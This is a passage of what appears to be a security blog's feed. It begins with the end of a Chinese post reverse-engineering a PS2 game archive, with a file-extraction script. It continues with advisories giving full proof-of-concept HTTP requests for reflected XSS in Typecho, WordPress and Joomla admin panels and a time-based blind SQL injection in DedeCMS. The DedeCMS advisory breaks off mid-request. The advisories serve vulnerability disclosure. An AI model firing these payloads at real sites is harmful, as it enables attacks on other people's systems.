<code>0xff</code>，并且出现的数量并不确定，但是总是会填充到整数后出现其他内容，推测 <code>0xff</code> 可能用于填充对其并分割不同文件，例如下图中 <code>SYSTEM.BIN</code> 的第一段代码被 <code>0xff</code> 填充并对齐到了 0x1800，作为一个 chunk</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/7.jpg" alt="SYSTEM.BIN"></p><p>继续向后分析几段，可以发现每一个 chunk 的大小都是不同的，但都是整数，其实分析到这里基本可以确定大量的 <code>0xff</code> 的作用就是分隔文件内容，但是至于为什么要填充到某个具体的整数，原因未知，例如 <code>SYSTEM.BIN</code> 第一个 chunk 为什么填充到 0x1800 而不是 0x1700。</p><p>继续分析 <code>SYSTEM.HD</code> 中的内容</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/8.jpg" alt="SYSTEM.HD"></p><p>第一眼就可以看到大量的 <code>00 00</code>，少部分的 <code>01 00</code>，根据经验推测很有可能是小端存储的 int，每 4 个字节作为一个数字，查看其他几个 <code>.HD</code> 文件也可以看出 <code>.HD</code> 文件大小一定是 4 的倍数。但是每个 int 并没有什么规律，有大有小，也没有经过排序。</p><p>根据以往的逆向经历，例如对阴阳师 <code>.npk</code> 的逆向，通过头表（Header Table）中存储的偏移 offset 和文件长度 length 这两个值就可以从打包存储的数据中提取指定位置的文件，因此这个 int 一定是 offset 或者 length 之一，才会与 <code>.BIN</code> 相对应。假如 int 表示的是 offset，存储偏移的表通常是有顺序的，并且偏移一定是唯一的，而在某些 <code>.HD</code> 文件中出现了重复的值，因此这里的 int 一定不是偏移，怀疑可能是 length。</p><p>根据前文的结论，<code>.BIN</code> 的一个 chunk 前一部分保存了文件内容，后一部分保存 <code>0xff</code> 用于对齐分隔，假设 <code>.HD</code> 中第一个值 0x131e 对应的是 <code>.BIN</code> 中的第一个文件内容的长度而不是 chunk 的长度，验证一下</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/9.jpg" alt="SYSTEM.BIN"></p><p><code>SYSTEM.BIN</code> 中第一个文件内容长度刚好是 0x131e，对应 <code>SYSTEM.HD</code> 的第一个小端 int <code>1E 13 00 00</code>，再验证一下下一个 chunk 刚好也是 0x15e4，对应 <code>SYSTEM.HD</code> 的第二个小端 int <code>E4 15 00 00</code></p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/10.jpg" alt="SYSTEM.BIN"></p><p>验证其他几个 <code>.BIN</code> 和 <code>.HD</code> 也可以得到同样的结论。到此，基本就可以确定 <code>.HD</code> 中保存的就是 <code>.BIN</code> 中每个文件内容的长度，并且每个文件内容后会被填充大量的 <code>0xff</code> 分隔同时对其到某个整数。那么基于此，可以写出对应的提取脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: extract.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#     Extract files from .BIN by .HD in some ps2 games.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">name, ext=<span class="string">&quot;dat&quot;</span></span>):</span><br><span class="line">    output_dir = <span class="string">&quot;./&quot;</span> + name + <span class="string">&quot;_extracted&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_dir):</span><br><span class="line">        os.mkdir(output_dir)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Extracting &quot;%s&quot; to &quot;%s&quot;...&#x27;</span> % (name, output_dir))</span><br><span class="line"></span><br><span class="line">    hd_file = name + <span class="string">&quot;.HD&quot;</span></span><br><span class="line">    hd_filesize = os.path.getsize(hd_file)</span><br><span class="line">    hd_file = <span class="built_in">open</span>(hd_file, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    bin_file = name + <span class="string">&quot;.BIN&quot;</span></span><br><span class="line">    bin_filesize = os.path.getsize(bin_file)</span><br><span class="line">    bin_file = <span class="built_in">open</span>(bin_file, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hd_filesize % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  Invalid head file size: &quot;</span> + <span class="built_in">hex</span>(hd_filesize))</span><br><span class="line">        bin_file.close()</span><br><span class="line">        hd_file.close()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  Head file size: &quot;</span> + <span class="built_in">hex</span>(hd_filesize))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  Bin file size: &quot;</span> + <span class="built_in">hex</span>(bin_filesize))</span><br><span class="line"></span><br><span class="line">    file_count = hd_filesize &gt;&gt; <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  Total %d files to be extracted.&quot;</span> % file_count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(file_count):</span><br><span class="line">        filesize = struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, hd_file.read(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">        filename = os.path.join(</span><br><span class="line">            output_dir,</span><br><span class="line">            <span class="string">&quot;%d_%s_%s.%s&quot;</span> % (i, <span class="built_in">hex</span>(bin_file.tell())[<span class="number">2</span>:], <span class="built_in">hex</span>(filesize)[<span class="number">2</span>:], ext),</span><br><span class="line">        )</span><br><span class="line">        data = bin_file.read(filesize)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(data)</span><br><span class="line"></span><br><span class="line">        chunk_size = filesize</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = bin_file.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> data != <span class="string">b&quot;\xff&quot;</span>:</span><br><span class="line">                bin_file.seek(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            chunk_size += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&#x27;    [%d] Extracted file to &quot;%s&quot; with filesize %s in chunk size %s&#x27;</span></span><br><span class="line">            % (i, filename, <span class="built_in">hex</span>(filesize), <span class="built_in">hex</span>(chunk_size))</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bin_file.tell() != bin_filesize:</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;  Bin file not finished! Current offset in %s but filesize is %s!&quot;</span></span><br><span class="line">            % (<span class="built_in">hex</span>(bin_file.tell()), <span class="built_in">hex</span>(bin_filesize))</span><br><span class="line">        )</span><br><span class="line">    bin_file.close()</span><br><span class="line">    hd_file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        main(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        main(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 CD 根目录执行脚本 <code>python extract.py &lt;name&gt; [ext=dat]</code>，例如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python extract.py SYSTEM</span><br></pre></td></tr></table></figure><p>同时可以指定提取出的文件后缀，默认是 <code>.dat</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python extract.py SYSTEM py</span><br></pre></td></tr></table></figure><p>提取出的文件后保存在 <code>&lt;name&gt;_extracted</code> 目录中，例如 <code>SYSTEM_extracted</code>，文件名为 <code>id_offset_length.ext</code>，其中 <code>id</code> 为文件序号，按照文件出现的顺序从 0 开始，<code>offset</code> 为文件在 <code>.BIN</code> 中的偏移，<code>length</code> 为 <code>.HD</code>中保存的文件内容大小。</p><p>最后按顺序提取出 <code>NORMAL.BIN</code>，<code>SCENE_ID.BIN</code>，<code>SCENEDAT.BIN</code>，<code>SOUND_ID.BIN</code>，<code>SYSTEM.BIN</code> 以及 <code>VOICE_ID.BIN</code> 中的所有文件。</p>]]></content>
      
      
      <categories>
          
          <category> Hack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReverseEngineering </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typecho V1.2.0 Backend Reflected XSS</title>
      <link href="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/"/>
      <url>/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Typecho admin backend Comment Manager <code>/admin/manage-comments.php</code> with reflected-XSS via unfiltered POST parameter <code>cid</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to typecho admin backend management system.</li><li>In Comment Manager <code>/admin/manage-comments.php</code>, the unfiltered <code>$request-&gt;cid</code> is directly echoed to html.</li></ol><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/6.png"></p><p>The full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/typecho/admin/manage-comments.php?status=wating&amp;category=&amp;keywords=abc&amp;__typecho_all_posts=off&amp;uid=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.10</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.10/cms/typecho/admin/login.php?referer=http%3A%2F%2F192.168.0.10%2Fcms%2Ftypecho%2Fadmin%2Fmanage-comments.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>745020ecd4b17dde48d43755702a78b4__typecho_uid=1; 745020ecd4b17dde48d43755702a78b4__typecho_authCode=%24T%249aGUcl7K02f405471bbdacf65892bf8ffb75bc211; PHPSESSID=m7h7isuus6cugk6mb58vdah296; u5DD_2132_saltkey=ql9191Ym; u5DD_2132_lastvisit=1677486351; u5DD_2132_seccodecSASGLE52ETX=1.1b4fba6d0be0f7dce2; u5DD_2132_ulastactivity=dd6b5bfUH2dwkFNJ5HnOvs2bnRKl16bY2TMsiYWsOsPOeru7pyMl; u5DD_2132_auth=ade9wjKb33QiAdI8RrnDloFyK4vB8ca3sx7pIgT0BNlWPo1CeA%2Bsk87ST8rZ%2FVqZTdeIhOInVMfZCF8zm7uu; u5DD_2132_lastcheckfeed=1%7C1677489964; u5DD_2132_nofavfid=1; u5DD_2132_home_diymode=1; u5DD_2132_visitedfid=2; u5DD_2132_smile=1D1; u5DD_2132_home_readfeed=1677497943; u5DD_2132_forum_lastvisit=D_2_1677498054; u5DD_2132_st_t=1%7C1677498055%7C9149ebde1ec47006277ae3faf93f0e2f; u5DD_2132_editormode_e=1; u5DD_2132_st_p=1%7C1677498095%7C926ebc78300a154f5ad9ebb023eb0b77; u5DD_2132_viewid=tid_1; u5DD_2132_seccode=5.792e3c6d8b004d4403; u5DD_2132_seccodecSE52ETX=6.a73b7daa353701b59a</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44</span><br><span class="line"></span><br><span class="line"><span class="language-xml">coid[]=1&amp;cid=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--</span></span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/2.png"></p><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/3.png"></p><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/4.png"></p><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/5.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/typecho/typecho/issues/1539">Github Issue</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WordPress V6.2 Backend Reflected-XSS</title>
      <link href="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/"/>
      <url>/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend theme file editor component with reflected-XSS via POST parameter <code>newcontent</code> when the POST parameter <code>theme</code> does not exist.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>WordPress &lt;= 6.2</p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin background management, editing a theme file in theme file editor component.</li><li>POST to <code>/wp-admin/theme-editor.php</code> with the right wordpress nonce, as well as the <code>newcontent</code> parameter which contains the XSS payload, e.g. <code>&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;&lt;!--</code>, remove the <code>theme</code> parameter at the same time.</li></ol><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/2.png"></p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/3.png"></p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/4.png"></p><p>In source code of <code>/wp-admin/theme-editor.php</code>, at line 125, the <code>newcontent</code> passes to <code>$post_content</code>, but <code>wp_unslash</code> does not filter any XSS payload.</p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/5.png"></p><p>At line 129, <code>$post_content</code> passes to <code>$content</code>, and at line 291, the <code>$content</code> is directly echoed to html.</p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/6.png"></p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/7.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/wordpress/wp-admin/theme-editor.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.10</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>193</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.0.10</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.10/cms/wordpress/wp-admin/theme-editor.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>wordpress_a59a53e68d3cbba0d705bf0e4b02207b=admin%7C1678689608%7C1S0SKogKJyuDtqkpi3cDcwCyeAvKDNdQ6OW4BtMYgJQ%7Caf4d97cb01e4752e872af6fc5226c89263904830dda087656dbbd0fa79fcf29a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_a59a53e68d3cbba0d705bf0e4b02207b=admin%7C1678689608%7C1S0SKogKJyuDtqkpi3cDcwCyeAvKDNdQ6OW4BtMYgJQ%7Ce2441da59527b55b9831572be4c5a5955c9acb44a4d72e2477feabfbb4efba21; wp-settings-time-1=1677480056; PHPSESSID=m7h7isuus6cugk6mb58vdah296</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">nonce<span class="operator">=</span>f<span class="number">8</span>bc<span class="number">8439</span>a<span class="number">1</span>&amp;_wp_http_referer<span class="operator">=</span><span class="variable">%2</span>Fcms<span class="variable">%2</span>Fwordpress<span class="variable">%2</span>Fwp-admin<span class="variable">%2</span>Ftheme-editor.php&amp;newcontent<span class="operator">=</span>&lt;/textarea&gt;&lt;img<span class="variable">%20</span>src<span class="operator">=</span><span class="keyword">x</span><span class="variable">%20</span>onerror<span class="operator">=</span>alert(<span class="number">1</span>)&gt;&lt;<span class="title">!--</span>&amp;action<span class="operator">=</span>update&amp;file<span class="operator">=</span>style.css&amp;themexxx<span class="operator">=</span>twentytwentythree</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://hackerone.com/bugs?report_id=1888329&subject=user">HackerOne</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Joomla V4.2.8 Backend Reflected-XSS</title>
      <link href="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/"/>
      <url>/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend Multi-factor Authentication component with reflected-XSS via base64-encoded GET parameters <code>returnurl</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Joomla &lt;= 4.2.8</p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to Joomla CMS admin backend management, enter into the Multi-factor Authentication component.</li><li>No matter add a new or edit an existed multi-factor authentication method, there is always a base64-encoded URL parameter <code>returnurl</code>.</li><li>The value of <code>returnurl</code> will be decoded by base64 and appeared in html attribute <code>href</code> of <code>&lt;a&gt;</code> tag, which in the “Save &amp; Close” and “Cancel” button.</li><li>Change the value of <code>returnurl</code> to base64-encoded XSS payload, e.g. <code>amF2YXNjcmlwdDphbGVydCgxKTs=</code>, which is the <code>javascript: alert(1)</code>, and request the page with <code>returnurl</code> parameter, the payload will be injected to the “href”.</li></ol><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/2.png"></p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/3.png"></p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/4.png"></p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/5.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/joomla/administrator/index.php?option=com_users&amp;task=method.add&amp;method=yubikey&amp;user_id=220&amp;returnurl=amF2YXNjcmlwdDphbGVydCgxKTs%3D</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>atumSidebarState=open; 8bf89f010a5bbff54669e4ad47111f59=8nunecujukuvngvnu63fptrr0t; c04ce7edc2a8825a69f250555054fe73=ujj34jaqqm0md1cihnph0q3a20; PHPSESSID=enl8bvb5tmdfidt9kmvvekicr7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://huntr.dev/bounties/1fb9daa4-417a-4730-bb9e-46ea0b865184">huntr</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS V5.7.160 Backend Blind SQL Injection</title>
      <link href="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/"/>
      <url>/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend group store blind SQL injection via post parameters.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DedeCMS &lt;= 5.7.160</p><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management.</li><li>Request to <code>/dede/group_store.php</code> with GET parameter <code>action=uprank</code> and POST parameters <code>rank_1=1&#39;+and+sleep(3)+and+&#39;1</code>, this payload will lead to a time-based SQL injection.</li><li>In the source code of <code>/dede/group_store.php</code>, when the GET parameter <code>action</code> is <code>uprank</code>, the POST value which the key contains <code>rank_</code> will be directly joined into the update SQL statement, which lead to SQL update injection, finally the joint statement will be passed through <code>mysqli_query</code>, but this function only return boolean value when the query string is an update statement, that is why this is a blind injection.</li></ol><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/2.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/dedecms/dede/group_store.php?action=uprank</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span 